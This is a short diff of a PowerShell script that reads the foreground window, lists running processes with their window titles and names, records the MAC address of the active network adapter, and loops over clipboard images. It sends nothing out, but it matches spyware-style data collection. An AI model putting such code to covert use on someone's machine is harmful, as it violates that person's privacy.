@@ -8,7 +8,7 @@ Add-Type @"
 "@
 
 $a = [tricks]::GetForegroundWindow()
-$process = (Get-Process |where {$_.mainWindowTItle} | select mainwindowtitle).mainwindowtitle
+$process = (Get-Process |where {$_.mainWindowTItle} | select mainwindowtitle, processname)
 $MAC = (Get-NetAdapter | where-object -FilterScript {$_.HardwareInterface -eq "True" -and $_.Status -ne "Disconnected"}).MacAddress
 do {
 $content = Get-Clipboard -Format Image
